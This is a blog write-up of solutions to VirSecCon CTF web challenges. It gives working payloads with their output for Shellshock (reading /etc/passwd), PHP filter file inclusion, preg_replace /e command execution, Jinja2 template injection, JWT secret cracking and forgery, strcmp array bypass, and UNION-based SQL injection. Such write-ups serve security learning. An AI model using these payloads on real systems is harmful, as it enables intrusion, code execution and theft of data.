---
layout: post
cover: False
cover: ''
title: "[VirSecCon] - Web Challenges - Solutions"
date:   2020-04-05 08:18:00
tags: CTF Vulnhub Hacking ITsecurity
categories: 'ctf'
navigation: True
---

In this post, I will be showing my solutions from `VirSecCon`, it was a nice experince. Notice that I only spend copule of hours. I may add couple of other solutions from Web challenges. Thanks `John` for a nice experince.


### Crush : Web Challenge
It was a hint in the website about this vulnerability, then found the `crush.sh` file. It is seems to be a `shellshock exploit`

```sh
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://jh2i.com:50020/cgi-bin/crush.sh

root:x:0:0:root:/root:/bin/bash
**deleted**
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
flag:x:1000:1000::/home/flag:/bin/sh

```

There is a username `flag` and using `ls` on the flag's home directory, I found the flag file `flag.txt`

```sh
yas3r@linux[~/CTF/VirSecCon]$ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /home/flag/flag.txt'" http://jh2i.com:50020/cgi-bin/crush.sh

LLS{woah_dude_radical_shellshock}
```

 ### HotAccess : Web Challenge

This challenge is introduction to `LFI` but we need to find the hidden flag, the following url is vulnerable to `lfi` : `http://jh2i.com:50016/index.php?m=`

Let's read the source code of the index.php

```sh
http://jh2i.com:50016/index.php?m=php://filter/convert.base64-encode/resource=index.php
PGh0bWw+CgoJPGhlYWQ+CgkJPG1ldGEgY2hhcnNldD0idXRmLTgiPgoJCTx0aXRsZT4KCQkJIkhvdCBBY2Nlc3MiIC0gQSBRdWljayBNb2R1bGUgTG9hZGVyCgkJPC90aXRsZT4KCQk8c3R5bGU+IGJvZHl7IHBhZGRpbmc6IDEwJSAyMCU7IH0gcHJleyBwYWRkaW5nLWxlZnQ6IDUlOyB9PC9zdHlsZT4KCTwvaGVhZD4KCTxib2R5PgoKCgkJPGgxPiBIb3QgQWNjZXNzIDwvaDE+CgkJPGg0PiBBIFF1aWNrIE1vZHVsZSBMb2FkZXIgPC9oND4KCgkJPGhyPgoKCQk8cD48aT4KCQkJVGhpcyBzbWFsbCBwcm9ncmFtIGxldHMgeW91IGxvYWQgY29udmVuaWVudCBhbmQgc2ltcGxlIFBIUCBtb2R1bGVzIGFuZCByZXNvdXJjZXMgZnJvbSB0aGlzIDxiPjx1PkFwYWNoZTwvdT48L2I+IAoJCQl3ZWJzZXJ2ZXIuIENoZWNrIG91dCB3aGF0IDxpPnlvdTwvaT4gY2FuIDxiPmFjY2VzczwvYj4hCgkJPC9pPjwvcD4KCgkJPHA+CgkJCVRoZSBtb2R1bGVzIHRoYXQgYXJlIGN1cnJlbnRseSBhdmFpbGFibGUgYXJlOgoJCTwvcD4KCgkJPHVsPgoJCQk8bGk+IDxhIGhyZWY9Ijw/cGhwIGVjaG8oJ2h0dHA6Ly8nLiRfU0VSVkVSWydIVFRQX0hPU1QnXSkgPz4vP209bW9kdWxlcy9kYXRlLnBocCI+IGRhdGUgPC9hPjwvbGk+CgkJCTxsaT4gPGEgaHJlZj0iPD9waHAgZWNobygnaHR0cDovLycuJF9TRVJWRVJbJ0hUVFBfSE9TVCddKSA/Pi8/bT1tb2R1bGVzL3RpbWUucGhwIj4gdGltZSA8L2E+PC9saT4KCQk8L3VsPgoKCQk8aHI+CgkJPGJyPgoKCQk8cD4KCQkJVGhlIG1vZHVsZSBpcyBsb2FkZWQgYXMgZm9sbG93czoKCQk8L3A+CgkJCgkJPD9waHAKCQkKCQllY2hvKCc8cHJlPicpOwoKCQlpZiAoIGlzc2V0KCAkX0dFVFsnbSddICkgKXsKCQkJaW5jbHVkZSggJF9HRVRbJ20nXSAgKTsKCQl9CgkJZWxzZXsKCgkJCWVjaG8oJ1lvdSBoYXZlIG5vdCBlbnRlcmVkIGEgbW9kdWxlIHRvIGxvYWQuJyk7CgkJfQoKCQllY2hvKCc8L3ByZT4nKTsKCQkKCQk/PgoKCTwvYm9keT4KPC9odG1sPgo=
```
Also, lets read `date`	and `time` modules
```sh
yas3r@linux[~/CTF/VirSecCon]$ echo PD9waHAKCWVjaG8oZGF0ZSgiWS9tL2QiKSk7Cj8+ | base64 -d
<?php
	echo(date("Y/m/d"));
?>%                                                                                                       yas3r@linux[~/CTF/VirSecCon]$ cat PD9waHAKCWVjaG8oZGF0ZSgiaDppOnMgQSIpKTsKPz4=                       
yas3r@linux[~/CTF/VirSecCon]$ echo PD9waHAKCWVjaG8oZGF0ZSgiaDppOnMgQSIpKTsKPz4=| base64 -d
<?php
	echo(date("h:i:s A"));
?>%                                                                                                       ```

Spend time here to find something and trying to guessing the flag but then checked the description again and the hint in the `hotaccess`. So lets read the `.htaccess`. First try was not going well since the hidden `directory` embedded into the page and it wasn't showing in the front page. because we are dealing with `apache`. However, if we check the source code or send a request using `curl` we found it.

```sh
curl http://jh2i.com:50016/index.php?m=php://filter/convert.base64-encode/resource=.htaccess

yas3r@linux[~/CTF/VirSecCon]$ echo IDxEaXJlY3RvcnkgL3Zhci93d3cvaHRtbD4KCglPcHRpb25zIEluZGV4ZXMgRm9sbG93U3ltTGlua3MgTXVsdGlWaWV3cwoJQWxsb3dPdmVycmlkZSBBbGwKCU9yZGVyIGFsbG93LGRlbnkKCWFsbG93IGZyb20gYWxsCiAKIDwvRGlyZWN0b3J5PgoKICA8RGlyZWN0b3J5IC92YXIvd3d3L2h0bWwvc3NoaF9kb250X3RlbGxfaV9oaWRfdGhlX2ZsYWdfaGVyZT4KCQoJQWxsb3dPdmVycmlkZSBBbGwKIAogPC9EaXJlY3Rvcnk | base64 -d
 <Directory /var/www/html>

	Options Indexes FollowSymLinks MultiViews
	AllowOverride All
	Order allow,deny
	allow from all
 
 </Directory>

  <Directory /var/www/html/sshh_dont_tell_i_hid_the_flag_here>
	
	AllowOverride All
 
 </Directorybase64: invalid input
yas3r@linux[~/CTF/VirSecCon]

```

the visit `http://jh2i.com:50016/sshh_dont_tell_i_hid_the_flag_here/flag.txt` to read the flag `LLS{htaccess_can_control_what_you_access}`

### GLHF : Web Challenge

this challenge also could be solved using the same technique in `hotaccess` which is `LFI` 

```sh
curl http://jh2i.com:50014/index.php?page=php://filter/convert.base64-encode/resource=FLAG

yas3r@linux[~/CTF/VirSecCon]$ echo PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KICAgIDxoZWFkPgogICAgICAgIDx0aXRsZT4gUEhQTEZJWFlaIDwvdGl0bGU+CiAgICA8L2hlYWQ+CiAgICA8Ym9keT4KCiAgICA8aDE+IEZMQUc/Pz8/IDwvaDE+CgogICAgPGgxPiBXVEYsIFBMWj8/PyA8L2gxPgoKICAgIDwhLS0gU1JZIFBIUCBMRkkgTkJEIC0tPgoKICAgIDwvYm9keT4KPC9odG1sPgo8P3BocAogICAgLyoKICAgIC8vIF9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKICAgICAgICAgICAgICAgICAgICAgICAgTExTe2xtZmFvX3BocF9maWx0ZXJzX2Z0d30KCiAgICAvLyBfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KICAgICovCj8+Cg==  | base64 -d
<!DOCTYPE html>

<html>
    <head>
        <title> PHPLFIXYZ </title>
    </head>
    <body>

    <h1> FLAG???? </h1>

    <h1> WTF, PLZ??? </h1>

    <!-- SRY PHP LFI NBD -->

    </body>
</html>
<?php
    /*
    // _______________________________________________________________

                        LLS{lmfao_php_filters_ftw}

    // _______________________________________________________________
    */
?>
```
### Irregular Expressions : Web Challenge

This one is pretty old but still works in CTF challenges. The vulnerability in `preg_replace()` function in `PHP`, more information [here](https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace).

by adding in the filter field `/e system("cat flag_name_dont_guess_plz index.php ");` to read the flag `LLS{php_preg_replace_may_be_dangerous}`



### Mask : Web Challenge

By testing  `\{\{1+1\}\}`, we confirm that we are using `flask` framework. Let try to injection `python` code to read local files

```python
\{\{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() \}\}
```
but we couldn't find any interesting files, so lets read the server file itself.

`\{\{ ''.__class__.__mro__[2].__subclasses__()[40]('server.py').read() \}\}`


```python
 #!/usr/bin/env python

import flask
from flask import request, render_template_string


app = flask.Flask(__name__)
app.config.from_object(__name__)
app.secret_key = 'LLS{server_side_template_injection_unmasked}'


@app.route('/', methods = ["GET", "POST"])
def index(): 
    mask = "... you have not yet taken off your mask!"

**Deleted**

if ( __name__ == "__main__" ):

    app.run( host='0.0.0.0' )
```

We can find the flag: `LLS{server_side_template_injection_unmasked}`

### JaWT : Web Challenge

From the name, it was obvious that we are dealing with `JWT` vulnerability. There is also another hint were mention `john`. So lets create a new user and capture the `jwt` and crack it with `hashcat`

Here is : 
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCJ9.jbf34kzJ36YbWPQU69k-mlieDVmaWiIiAs6jPU1mH4o
```

Lets crack it with `hashcat` because why not
```sh
yas3r@linux[~/CTF/VirSecCon]$ hashcat -m 16500 jwt.hash /usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

```sh
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCJ9.jbf34kzJ36YbWPQU69k-mlieDVmaWiIiAs6jPU1mH4o:fuckit
```

The secret=`fuckit`

Now lets use jwt the online tool [here](https://jwt.io/#debugger-io?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.qfSqP1u-gAhG6r8Vfb31Fi5WkjYCxjRKhFEcLCde8O0) to create a new jwt string and sign it with `fuckit`.
by changing the user to `admin` and put the secret as `fuckit` and then resend it the server to see we are logged in as `admin`. Then, you will see the flag.

Flag `LLS{jawt_was_just_what_you_thought}`



### PHPJuggler : Web Challenge

give a source code 
```php
<?php
    
    include('flag.php');

    if ( isset($_POST['flag']) ){
        if ( strcmp( $_POST['flag'], $flag ) == 0 ){
            echo("You got it! That's the correct flag! <br>");
            echo($flag);
        }else{
            echo("NOPE! Wrong flag.");
        }
        echo ("<br><br>");
    }

    highlight_file(__FILE__);   
?>

<html>
<head> <title> PHP Juggler </title> </head>
    <body>
    <br><br>
    <form action="#" method="POST">
        <p> Tell me the flag. </p>
        <input type="text" name="flag">
        <input type="submit" value="Submit">
    </form>
</html>
```

we can see it been used `strcmp` to compare to value to `0`. This one is also an old vulnerability in `PHP`. By changing the parameter to array it will send type array which is read by `PHP` as `zero`

```
POST / HTTP/1.1

Host: jh2i.com:50030

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

Content-Type: application/x-www-form-urlencoded

Content-Length: 0



flag[]=0
```

and here is the responds,

```
Warning: strcmp() expects parameter 1 to be string, array given in /var/www/html/index.php on line 6
You got it! That's the correct flag!
LLS{php_dropped_the_ball_again}
```



### Sequelitis : Web Challenge

Here is a classic `SQL injection` 

to show all customers: `' or 1=1#;`
Union statement : `' union select 1,2,3#;`

then we found we have three databases:
```
1 information_schema: 3
1 mysql: 3
1 performance_schema: 3
1 sequelitis: 3
```
Lets check the tables of `sequelitis`
```sh
'+union+select+1,table_name,3+from+information_schema.tables+where+table_schema%3d'sequelitis'%23%3b

<pre>
Customers returned are:

1 customers: 3
1 flag: 3

</pre>
```
Now lets check columns name:

```sh
'+union+select+1,column_name,3+from+information_schema.columns+where+table_name%3d'flag'%23%3b

<pre>
Customers returned are:

1 value: 3

</pre>
```

Lets read the flag
```sh
first_name='+union+select+1,value,3+from+flag%23%3b
<pre>
Customers returned are:

1 LLS{explicit_sqli_is_how_sql_will_die}: 3

</pre>

```
